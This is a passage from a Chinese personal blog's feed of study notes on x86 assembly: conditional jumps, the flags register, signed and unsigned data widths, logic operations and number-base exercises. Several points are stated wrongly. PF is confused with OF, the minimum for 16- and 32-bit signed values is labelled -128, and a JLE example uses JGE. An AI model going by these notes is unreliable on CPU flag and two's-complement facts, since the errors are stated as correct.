JNGE 小于则跳转 (有符号数) SF≠ OF"></a>13、 JL, JNGE 小于则跳转 (有符号数) SF≠ OF</h4><pre><code>MOV AL,0XFFMOV CL,0X01CMP AL,CLJB 0X00401063JL 0X00401063</code></pre><p>解析：终于到了让我十分迷惑的有无符号JCC的跳转指令，这里做了对比JB JL,看标志位肯定能解决一切（这是对计算机来说），我们没看标志位提前做判断的诀窍：<strong>就是当你用有符号数JCC指令（JG,JL,JLE,JGE，JNG，JNL,JNGE，JNLE）的时候，一定要把两个操作数直接人工看做有符号来看！</strong></p><p><strong>比如这个练习用到了JL,FF就是-1了，那么<code>-1&lt;1</code>这个肯定的，所以JL跳转。但是对于JB，FF就是FF肯定大于1，所以没有跳转。</strong></p><h4 id="14、-JNL-JGE-大于等于则跳转-有符号数-SF-OF"><a href="#14、-JNL-JGE-大于等于则跳转-有符号数-SF-OF" class="headerlink" title="14、 JNL, JGE 大于等于则跳转 (有符号数) SF=OF"></a>14、 JNL, JGE 大于等于则跳转 (有符号数) SF=OF</h4><pre><code>MOV AL,1MOV CL,0CCCMP AL,CLJGE 0X0040108B</code></pre><h4 id="15、-JLE-JNG-小于等于则跳转-有符号数-ZF-1-or-SF≠-OF"><a href="#15、-JLE-JNG-小于等于则跳转-有符号数-ZF-1-or-SF≠-OF" class="headerlink" title="15、 JLE, JNG 小于等于则跳转 (有符号数) ZF=1 or SF≠ OF"></a>15、 JLE, JNG 小于等于则跳转 (有符号数) ZF=1 or SF≠ OF</h4><pre><code>MOV AL,1MOV CL,0CCCMP CL,ALJGE 0X0040108B</code></pre><p>这个就是对立15练习，想利用ZF等于1这个跳转，在cmp中没什么好整的，<strong>这两个操作数只能是相同的数，没什么看不看做有无符号的说法</strong>。</p><h4 id="16、-JNLE-JG-大于则跳转-有符号数-ZF-0-and-SF-OF"><a href="#16、-JNLE-JG-大于则跳转-有符号数-ZF-0-and-SF-OF" class="headerlink" title="16、 JNLE, JG 大于则跳转(有符号数) ZF=0 and SF=OF"></a>16、 JNLE, JG 大于则跳转(有符号数) ZF=0 and SF=OF</h4><pre><code>MOV AX,1MOV CX,FFCMP AX,CXJG  0x004010A6MOV AL,1MOV CL,0FFCMP AL,CLJG  0x004010A6</code></pre><p>解析：</p><p>判断一下，第1段代码对还是第2段代码对？</p><p>在原来的观点，对有符号JCC要把两个操作数看做转化后的有符号数对待，<strong>且一定要注意下数据宽度。</strong>在这个例子中，第一段代码是无法实现JG跳转的，<strong>因为其数据宽度的问题，影响到SF,所以其没办法<code>SF=OF</code>就没法跳转。</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;JCC学习&quot;&gt;&lt;a href=&quot;#JCC学习&quot; class=&quot;headerlink&quot; title=&quot;JCC学习&quot;&gt;&lt;/a&gt;JCC学习&lt;/h1&gt;&lt;h2 id=&quot;JCC指令集合&quot;&gt;&lt;a href=&quot;#JCC指令集合&quot; class=&quot;headerlink&quot; title=
      
    
    </summary>
    
    
      <category term="c与汇编" scheme="http://chumen77.xyz/tags/c%E4%B8%8E%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>标志寄存器</title>
    <link href="http://chumen77.xyz/2019/10/06/%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8/"/>
    <id>http://chumen77.xyz/2019/10/06/标志寄存器/</id>
    <published>2019-10-06T14:01:14.000Z</published>
    <updated>2020-02-28T07:54:01.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h1><h2 id="部分标志寄存器详细介绍"><a href="#部分标志寄存器详细介绍" class="headerlink" title="部分标志寄存器详细介绍"></a>部分标志寄存器详细介绍</h2><p><img src="/2019/10/06/标志寄存器/images/15704423980063.jpg" srcset="/img/loading.gif" alt><br>需要先熟练记住这几个寄存器的位置和名称：<code>CF PF AF ZF SF OF</code></p><h3 id="CF"><a href="#CF" class="headerlink" title="CF"></a>CF</h3><p>进位标志CF(Carry Flag):如果运算结果的<strong>最高位</strong>产生了一个进位或借位，那么，其值为1，否则其值为0。</p><p>解析：在看运算结果的时候，先提前确定好参与运算的数是<strong>有无符号数</strong>和<strong>它们的数据宽度</strong>。其与PF的难辨难分，重点是看参与运算的数是否为无符号数，这个是程序员写代码的时候定义的。默认都是有符号的，这就主要看后面的PF了。</p><h3 id="PF"><a href="#PF" class="headerlink" title="PF"></a>PF</h3><p>奇偶标志PF(Parity Flag)：PF标志位，根据结果中<strong>最低有效字节(最低8位)</strong>中“1”的个数来确定置1还是清0。如果“1”的个数为偶数，则PF的值为1，否则其值为0。</p><p>解析：这个在很多教材中是错的，这个需要强调根据的是运算结果的最低有效字节，也就是最低8位里面1的个数。</p><h3 id="AF"><a href="#AF" class="headerlink" title="AF"></a>AF</h3><p>辅助进位标志AF(Auxiliary Carry Flag)：<br>如果在“加”操作期间从低半字节（最低四位）到高半字节（高四位）有进位，或者在减法期间的低8位部分从高半字节到低半字节有借位，则将辅助标志设置为（1）。否则，如果不发生这种进位或借位，则清除标志或将其“复位”（设置为0）。<strong>—-（维基百科）</strong></p><p>辅助迸位标志:算数操作結果的第三位〈从0幵始计数〉如果发生了迸位或者借位則將其置为1,否則为0,常在BCD(binary-codedecimal)算木迄算中被使用。<strong>—（百度百科）</strong></p><p>解析：这个还是在很多资料上是错误的，在x86汇编上正确解释如上，也就是<strong>在D0-D7中，D3向D4位进位或者借位，才会置1。</strong>（这个当初老师讲错、百度高赞也是错的，要注意一下）。</p><h3 id="ZF"><a href="#ZF" class="headerlink" title="ZF"></a>ZF</h3><p>零标志ZF(Zero Flag)：零标志ZF用来反映运算结果是否为0。如果运算结果为0，则其值为1，否则其值为0。在判断运算结果是否为0时，可使用此标志位。<br>解析：引一下常用的<code>xor r8/16/32,r8/16/32</code>对寄存器清零操作。</p><h3 id="SF"><a href="#SF" class="headerlink" title="SF"></a>SF</h3><p>符号标志SF(Sign Flag)：符号标志SF用来反映运算结果的符号位，它与运算结果的最高位相同。</p><p>解析：还是需要确定数据宽度，看好到底哪个是最高位，然后把<strong>它换成2进制</strong>确定最高位是0还是1.<br>例子：</p><pre><code>MOV AL,20MOV CX,8000ADD AX,CX</code></pre><p><img src="/2019/10/06/标志寄存器/images/15704627287517.jpg" srcset="/img/loading.gif" alt="-w117"><br>这个就是在字上操作，然后相加结果是<code>8020</code>,最高位就是<code>1000</code>，那这个SF就是1了。要注意一下这个sf标志也是看数据宽度的。</p><h3 id="OF"><a href="#OF" class="headerlink" title="OF"></a>OF</h3><p>溢出标志OF(Overflow Flag)：溢出标志OF用于反映有符号数加减运算所得结果是否溢出。如果运算结果超过当前运算位数所能表示的范围，则称为溢出，OF的值被置为1，否则，OF的值被清为0。</p><p>解析：这个常与CF混淆，以为他们没啥区别，但是这个才是正宗的计算机看是否溢出的标志位。</p><p>CF与SF区别：</p><ul><li>进位标志表示<strong>无符号数</strong>运算结果是否超出范围.</li><li>溢出标志表示<strong>有符号数</strong>运算结果是否超出范围.</li></ul><p>溢出主要是给<strong>有符号运算</strong>使用的，在有符号的运算中，有如下的规律：</p><ul><li>正 + 正 = 正 如果结果是负数，则说明有溢出</li><li>负 + 负 = 负 如果结果是正数，则说明有溢出</li><li>正 + 负 永远都不会有溢出.<br><img src="/2019/10/06/标志寄存器/images/15704444932243.jpg" srcset="/img/loading.gif" alt="-w315"><br>结合这个图在应为对PF的判断，非常好用。<strong>判断的时候，一定注意PF是在有符号数做运算的时候去看的，无符号直接看CF就好了。</strong></li></ul><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><h3 id="写汇编指令只影响CF位的值"><a href="#写汇编指令只影响CF位的值" class="headerlink" title="写汇编指令只影响CF位的值"></a>写汇编指令只影响CF位的值</h3><pre><code>MOV AL,0FEADD AL,10</code></pre><p><img src="/2019/10/06/标志寄存器/images/15703705840520.jpg" srcset="/img/loading.gif" alt="-w669"></p><h3 id="写汇编指令只影响PF位的值"><a href="#写汇编指令只影响PF位的值" class="headerlink" title="写汇编指令只影响PF位的值"></a>写汇编指令只影响PF位的值</h3><pre><code>MOV AL,1ADD AL,2</code></pre><p><img src="/2019/10/06/标志寄存器/images/15703707829255.jpg" srcset="/img/loading.gif" alt="-w630"></p><h3 id="写汇编指令只影响AF位的值"><a href="#写汇编指令只影响AF位的值" class="headerlink" title="写汇编指令只影响AF位的值"></a>写汇编指令只影响AF位的值</h3><pre><code>MOV EAX,0FADD EAX,1</code></pre><p><img src="/2019/10/06/标志寄存器/images/15703770643896.jpg" srcset="/img/loading.gif" alt="-w588"></p><h3 id="写汇编指令只影响SF位的值"><a href="#写汇编指令只影响SF位的值" class="headerlink" title="写汇编指令只影响SF位的值"></a>写汇编指令只影响SF位的值</h3><pre><code>MOV CL,0F1ADD CL,1</code></pre><p><img src="/2019/10/06/标志寄存器/images/15703773573324.jpg" srcset="/img/loading.gif" alt="-w716"></p><h3 id="写汇编指令只影响OF位的值"><a href="#写汇编指令只影响OF位的值" class="headerlink" title="写汇编指令只影响OF位的值"></a>写汇编指令只影响OF位的值</h3><pre><code>MOV AL,80SUB AL,10 </code></pre><p>这个需要重视下，练习的时候有点受思维限制了。没有想到用SUB来构造出，<strong>站在80的位置顺时针查10，负-正=正</strong>，来实现溢出完成只影响OF位。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;标志寄存器&quot;&gt;&lt;a href=&quot;#标志寄存器&quot; class=&quot;headerlink&quot; title=&quot;标志寄存器&quot;&gt;&lt;/a&gt;标志寄存器&lt;/h1&gt;&lt;h2 id=&quot;部分标志寄存器详细介绍&quot;&gt;&lt;a href=&quot;#部分标志寄存器详细介绍&quot; class=&quot;headerlink
      
    
    </summary>
    
    
      <category term="c与汇编" scheme="http://chumen77.xyz/tags/c%E4%B8%8E%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>数据宽度与逻辑运算</title>
    <link href="http://chumen77.xyz/2019/10/01/%E6%95%B0%E6%8D%AE%E5%AE%BD%E5%BA%A6%E4%B8%8E%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97/"/>
    <id>http://chumen77.xyz/2019/10/01/数据宽度与逻辑运算/</id>
    <published>2019-10-01T13:08:32.000Z</published>
    <updated>2020-02-24T04:28:05.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="数据宽度与逻辑运算"><a href="#数据宽度与逻辑运算" class="headerlink" title="数据宽度与逻辑运算"></a>数据宽度与逻辑运算</h1><h2 id="数据宽度"><a href="#数据宽度" class="headerlink" title="数据宽度"></a>数据宽度</h2><p>数学上的数字，是没有大小限制的，可以无限的大。但在计算机中，由于受硬件的制约，数据都是有长度限制的（我们称为数据宽度），超过最多宽度的数据会被丢弃。</p><h3 id="对数据宽度的理解和有无符号数"><a href="#对数据宽度的理解和有无符号数" class="headerlink" title="对数据宽度的理解和有无符号数"></a>对数据宽度的理解和有无符号数</h3><h4 id="4位宽度表示"><a href="#4位宽度表示" class="headerlink" title="4位宽度表示"></a>4位宽度表示</h4><p>4位宽度表示：假设计算机只能存储4位2进制数：</p><table><thead><tr><th align="center">0000</th><th align="center">0001</th><th align="center">0010</th><th align="center">0011</th><th align="center">0100</th><th align="center">0101</th><th align="center">0110</th><th align="center">0111</th><th align="center">1000</th><th align="center">1001</th><th align="center">1010</th><th align="center">1011</th><th align="center">1100</th><th align="center">1101</th><th align="center">1110</th><th align="center">1111</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">1</td><td align="center">2</td><td align="center">3</td><td align="center">4</td><td align="center">5</td><td align="center">6</td><td align="center">7</td><td align="center">8</td><td align="center">9</td><td align="center">A</td><td align="center">B</td><td align="center">C</td><td align="center">D</td><td align="center">E</td><td align="center">F</td></tr></tbody></table><p><img src="/2019/10/01/数据宽度与逻辑运算/images/15699374653790.jpg" srcset="/img/loading.gif" alt="-w303"><br>存无符号数时：<code>0 1 2 3 4 5 6 7 8 9 A B C D E F</code><br>存有符号数时：<br>    正数：<code>0 1 2 3 4 5 6 7</code><br>    负数：<code>-1 -2 -3 -4 -5 -6 -7 -8</code><br>    其中对应关系：</p><table><thead><tr><th>-1</th><th>-2</th><th>-3</th><th>-4</th><th>-5</th><th>-6</th><th>-7</th><th>-8</th></tr></thead><tbody><tr><td>F</td><td>E</td><td>D</td><td>C</td><td>B</td><td>A</td><td>9</td><td>8</td></tr></tbody></table><p>无符号数时：从0到F逆时针依次增大。</p><p>有符号数时：含义从圆中间劈开，正数负数各一半，在F处为最大负数，0处为最小的正数。</p><h5 id="为什么在存有符号数时说开头为1的数就是负数？"><a href="#为什么在存有符号数时说开头为1的数就是负数？" class="headerlink" title="为什么在存有符号数时说开头为1的数就是负数？"></a>为什么在存有符号数时说开头为1的数就是负数？</h5><p>我们只看二进制：<br>| 0  | 1 | 2 | 3 | 4 | 5 | 6 | 7 |<br>| — | — | — | — | — | — | — | — | —  |<br>| 0000 | 0001 | 0010 | 0011 | 0100 | 0101 | 0110 | 0111 |</p><table><thead><tr><th>-1</th><th>-2</th><th>-3</th><th>-4</th><th>-5</th><th>-6</th><th>-7</th><th>-8</th></tr></thead><tbody><tr><td>1111</td><td>1110</td><td>1101</td><td>1100</td><td>1011</td><td>1010</td><td>1001</td><td>1000</td></tr><tr><td>很明显就可以看出，当二进制开头为1的时候对应存的数值就是负数了。</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td><strong>举例：对1011的理解</strong></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>1011在我们当做是有符号时就是-5，无符号就是B。<strong>这个完全看我们如何去定义。</strong></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>#### 8位宽度：</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>8位宽度表示：假设计算机只能存储8位2进制数。</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td><img src="/2019/10/01/数据宽度与逻辑运算/images/15699387217727.jpg" srcset="/img/loading.gif" alt="-w315"></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>无符号数：0 1 2 3 4 ……FF</p><p>有符号数：<br>正数：0 1 2 3 4 5 6 7 …7F<br>负数： </p><table><thead><tr><th>-1</th><th>-2</th><th>-3</th><th>-4</th><th>-5</th><th>-6</th><th>-7</th><th>-8</th><th>….</th><th>-128</th></tr></thead><tbody><tr><td>FF</td><td>FE</td><td>FD</td><td>FC</td><td>FB</td><td>FA</td><td>F9</td><td>F8</td><td>….</td><td>80</td></tr></tbody></table><h4 id="16位宽度"><a href="#16位宽度" class="headerlink" title="16位宽度"></a>16位宽度</h4><p>16位宽度表示：假设计算机只能存储16位2进制数<br><img src="/2019/10/01/数据宽度与逻辑运算/images/15699389940266.jpg" srcset="/img/loading.gif" alt="-w317"><br>无符号数：0 1 2 3 4 ……FFFF</p><p>有符号数：<br>正数：0 1 2 3 4 5 6 7 …7FFF<br>负数： </p><table><thead><tr><th>-1</th><th>-2</th><th>-3</th><th>-4</th><th>-5</th><th>-6</th><th>-7</th><th>-8</th><th>….</th><th>-128</th></tr></thead><tbody><tr><td>FFFF</td><td>FFFE</td><td>FFFD</td><td>FFFC</td><td>FFFB</td><td>FFFA</td><td>FFF9</td><td>FFF8</td><td>….</td><td>8000</td></tr></tbody></table><h4 id="32位宽度"><a href="#32位宽度" class="headerlink" title="32位宽度"></a>32位宽度</h4><p>32位宽度表示：假设计算机只能存储32位2进制数<br><img src="/2019/10/01/数据宽度与逻辑运算/images/15699391219590.jpg" srcset="/img/loading.gif" alt="-w378"><br>无符号数：0 1 2 3 4 ……FFFFFFFF</p><p>有符号数：<br>正数：0 1 2 3 4 5 6 7 …7FFFFFFF<br>负数： </p><table><thead><tr><th>-1</th><th>-2</th><th>-3</th><th>-4</th><th>-5</th><th>-6</th><th>-7</th><th>-8</th><th>….</th><th>-128</th></tr></thead><tbody><tr><td>FFFFFFFF</td><td>FFFFFFFE</td><td>FFFFFFFD</td><td>FFFFFFFC</td><td>FFFFFFFB</td><td>FFFFFFFA</td><td>FFFFFFF9</td><td>FFFFFFF8</td><td>….</td><td>80000000</td></tr><tr><td>### 几个本质问题</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>1：计算机除了0和1什么也不认识。</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>2：如果存的数据超过数据长度限制，超过的会直接抛弃。</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>3：有符号数和无符号数是我们自己用的时候定义的，定义是什么就是什么。</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>### 几个重要的计量单位：</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>BYTE  字节  8BIT</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>WORD  字   16BIT 2字节</p><p>DWORD 双字 32BIT 4字节</p><h2 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h2><h3 id="二进制的逻辑运算："><a href="#二进制的逻辑运算：" class="headerlink" title="二进制的逻辑运算："></a>二进制的逻辑运算：</h3><h4 id="or："><a href="#or：" class="headerlink" title="or："></a>or：</h4><p>或(or |)  只要有一个为1就是1<br><img src="/2019/10/01/数据宽度与逻辑运算/images/15699395390213.jpg" srcset="/img/loading.gif" alt="-w915"></p><h4 id="and："><a href="#and：" class="headerlink" title="and："></a>and：</h4><p>与(and &amp;)两个都为1才是1<br><img src="/2019/10/01/数据宽度与逻辑运算/images/15699396122732.jpg" srcset="/img/loading.gif" alt="-w871"></p><h4 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h4><p>异或（xor) 不一样为1<br><img src="/2019/10/01/数据宽度与逻辑运算/images/15699397540402.jpg" srcset="/img/loading.gif" alt="-w928"><br>ps：错位了。。。</p><h4 id="not"><a href="#not" class="headerlink" title="not"></a>not</h4><p>非(not !) 1是0 0是1<br><img src="/2019/10/01/数据宽度与逻辑运算/images/15699398562544.jpg" srcset="/img/loading.gif" alt="-w255"></p><h3 id="逻辑运算的具体应用："><a href="#逻辑运算的具体应用：" class="headerlink" title="逻辑运算的具体应用："></a>逻辑运算的具体应用：</h3><h4 id="想获取某个值得第N位的值是1还是0"><a href="#想获取某个值得第N位的值是1还是0" class="headerlink" title="想获取某个值得第N位的值是1还是0"></a>想获取某个值得第N位的值是1还是0</h4><p>如：8F<br>        <img src="/2019/10/01/数据宽度与逻辑运算/images/15700250078922.jpg" srcset="/img/loading.gif" alt="-w135"><br><strong>方法</strong>：想看下第四位是0还是1，就写个第四个位为1其他都为0的数，然后进行一个与运算，如果出来结果是1.那就证明第四位就是1。</p><h4 id="最简单的加密算法："><a href="#最简单的加密算法：" class="headerlink" title="最简单的加密算法："></a>最简单的加密算法：</h4><p>如：<br>要加密的数据：2015<br>密钥：54<br>因为密钥是两位的，所以要对2015分为<code>20</code>和<code>15</code>。<br><img src="/2019/10/01/数据宽度与逻辑运算/images/15701063449646.jpg" srcset="/img/loading.gif" alt="-w279"><br>进行一次xor运算，出来就是加密后的值：<code>74</code> <code>41</code><br>当用他俩再进行一次xor运算：<br><img src="/2019/10/01/数据宽度与逻辑运算/images/15701064241084.jpg" srcset="/img/loading.gif" alt="-w253"><br>就又变成了2015。这就完成了加密解密。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;数据宽度与逻辑运算&quot;&gt;&lt;a href=&quot;#数据宽度与逻辑运算&quot; class=&quot;headerlink&quot; title=&quot;数据宽度与逻辑运算&quot;&gt;&lt;/a&gt;数据宽度与逻辑运算&lt;/h1&gt;&lt;h2 id=&quot;数据宽度&quot;&gt;&lt;a href=&quot;#数据宽度&quot; class=&quot;headerli
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>进制学习</title>
    <link href="http://chumen77.xyz/2019/09/28/%E8%BF%9B%E5%88%B6%E5%AD%A6%E4%B9%A0/"/>
    <id>http://chumen77.xyz/2019/09/28/进制学习/</id>
    <published>2019-09-28T03:52:16.000Z</published>
    <updated>2019-10-17T16:01:09.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="进制学习"><a href="#进制学习" class="headerlink" title="进制学习"></a>进制学习</h1><h2 id="进制的定义"><a href="#进制的定义" class="headerlink" title="进制的定义"></a>进制的定义</h2><p>十进制的定义:由十个符号组成，分别是<code>0 1 2 3 4 5 6 7 8 9</code>逢十进一。</p><p>九进制的定义:由九个符号组成，分别是<code>0 1 2 3 4 5 6 7 8</code>逢九进一。</p><p>十六进制的定义:由十六个符号组成，分别是<code>0 1 2 3 4 5 6 7 8 9 A B C D E F</code></p><h2 id="进制的本质"><a href="#进制的本质" class="headerlink" title="进制的本质"></a>进制的本质</h2><p>例如十进制：<code>0 1 2 3 4 5 6 7 8 9</code> 其就是由10个<strong>符号</strong>组成。如果定义其为<code>9 1 5 2 4 7 6 3 8 0</code>,或者换成<img src="/2019/09/28/进制学习/images/15696440221558.jpg" srcset="/img/loading.gif" alt="-w315">,如果用上面的符号进行加密与解密，让不懂进制本质的人解密有很大的阻碍。</p><h2 id="二进制与十六进制的映射关系"><a href="#二进制与十六进制的映射关系" class="headerlink" title="二进制与十六进制的映射关系"></a>二进制与十六进制的映射关系</h2><p><img src="/2019/09/28/进制学习/images/15698464290376.jpg" srcset="/img/loading.gif" alt="-w911"><br>这个需要背会。</p><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><h3 id="正常认知的进制："><a href="#正常认知的进制：" class="headerlink" title="正常认知的进制："></a>正常认知的进制：</h3><h4 id="二进制"><a href="#二进制" class="headerlink" title="二进制"></a>二进制</h4><p>从0写到100</p><p><img src="/2019/09/28/进制学习/images/15713236407261.jpg" srcset="/img/loading.gif" alt="-w900"></p><h4 id="七进制"><a href="#七进制" class="headerlink" title="七进制"></a>七进制</h4><p>编制7进制加法表，乘法表，并计算下面的结果：<strong>23456+54356=？5621-654=？234*65=？</strong><br><img src="/2019/09/28/进制学习/images/15713237049873.jpg" srcset="/img/loading.gif" alt="-w608"><br>7进制加法表：<br><img src="/2019/09/28/进制学习/images/15713237825325.jpg" srcset="/img/loading.gif" alt="-w541"><br>7进制乘法表：<br><img src="/2019/09/28/进制学习/images/15713238136767.jpg" srcset="/img/loading.gif" alt="-w537"><br>粗略计算过程：<br><img src="/2019/09/28/进制学习/images/15713245566592.jpg" srcset="/img/loading.gif" alt="-w275"><br>本质就是直接查表了。</p><h4 id="十六进制："><a href="#十六进制：" class="headerlink" title="十六进制："></a>十六进制：</h4><p>编制16进制加法表，乘法表，并计算下面的结果：2D4E6+CF3A6=？5FD1-E5A=？2CA*A5=？<br><img src="/2019/09/28/进制学习/images/15713241502952.jpg" srcset="/img/loading.gif" alt="-w1387"><br>16进制加法：<br><img src="/2019/09/28/进制学习/images/15713241702367.jpg" srcset="/img/loading.gif" alt="-w1337"><br>16进制乘法表：<br><img src="/2019/09/28/进制学习/images/15713241834458.jpg" srcset="/img/loading.gif" alt="-w1330"><br>粗略计算过程：<br><img src="/2019/09/28/进制学习/images/15713245906184.jpg" srcset="/img/loading.gif" alt="-w238"></p><p>都是查表。</p><h3 id="面向本质的非认知进制："><a href="#面向本质的非认知进制：" class="headerlink" title="面向本质的非认知进制："></a>面向本质的非认知进制：</h3><h4 id="一："><a href="#一：" class="headerlink" title="一："></a>一：</h4><p><strong>9进制定义：由9个符号组成，分别是：2、9、1、7、6、5、4、8、3，逢9进1</strong></p><p><strong>计算：123 + 234 = ?</strong></p><p>先画个进制表：<br><img src="/2019/09/28/进制学习/images/15699252652163.jpg" srcset="/img/loading.gif" alt="-w489"><br>然后计算：<br><img src="/2019/09/28/进制学习/images/15699253052200.jpg" srcset="/img/loading.gif" alt="-w154"></p><p><strong>解题过程:</strong><br>1)最后一位3+4中的4是第6个数，所以3+4 可以看成从3向后数6个为95，取最后一个5且有一个进位<br>2)最后第二位2+3中的2是第0个数，所以2+3相当3，有一个进位，需要再向后查一个是92，取最后一位2且进1位<br>3)第一位1+2中的2是第0个数，所以1+2相当于1，有一个进位，要再向后查一个，再查一位是7，所以最后是725</p><h4 id="二："><a href="#二：" class="headerlink" title="二："></a>二：</h4><p><strong>10进制定义：由10个符号组成，分别是：!、@、$、%、^、&amp;、*、A、B、C，逢10进1</strong></p><p>计算：@$$B + %AC&amp; = ? </p><p>先画个进制表：<br><img src="/2019/09/28/进制学习/images/15699343877953.jpg" srcset="/img/loading.gif" alt="-w583"><br>然后计算：<br><img src="/2019/09/28/进制学习/images/15699344047423.jpg" srcset="/img/loading.gif" alt="-w185"></p><p><strong>解题过程：</strong><br>1)最后一位<code>B+&amp;</code>中的<code>&amp;</code>是第5个数，所以<code>B+&amp;</code>可以看成从B向后数5个为<code>@%</code>，取最后一个<code>%</code>且有一个进位<br>2)最后第二位<code>$+C</code>中的C是第9个数，所以<code>$+C</code>相当从<code>$</code>开始查9个数，前面有一个进位，需要再向后查一个是<code>@$</code>，取最后一位<code>$</code>且进1位<br>3)最后第三位<code>$+A</code>中的A是第7个数，所以<code>$+A</code>相当于从<code>$</code>开始往后查7个，有一个进位，要再向后查一个，再查一位是<code>@!</code>，所以最后是<code>!</code>且进一位<br>4)第一位的<code>@+%</code>中的@是第一个数，所以<code>@+%</code>相当于从<code>%</code>在往后查一位，因为有个进位所以再往后查一位就是<code>&amp;</code>。所以答案就是<code>&amp;!$%</code>。</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>经过这次对进制的学习和练习，对进制理解更加的深刻，<strong>它们只是一堆符号</strong>，在达到某个程度后会进位罢了。在复习到c后，有时间可以学习一下写个进制加密的程序。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;进制学习&quot;&gt;&lt;a href=&quot;#进制学习&quot; class=&quot;headerlink&quot; title=&quot;进制学习&quot;&gt;&lt;/a&gt;进制学习&lt;/h1&gt;&lt;h2 id=&quot;进制的定义&quot;&gt;&lt;a href=&quot;#进制的定义&quot; class=&quot;headerlink&quot; title=&quot;进制的定义&quot;&gt;
      
    
    </summary>
    
    
  </entry>
  
</feed>
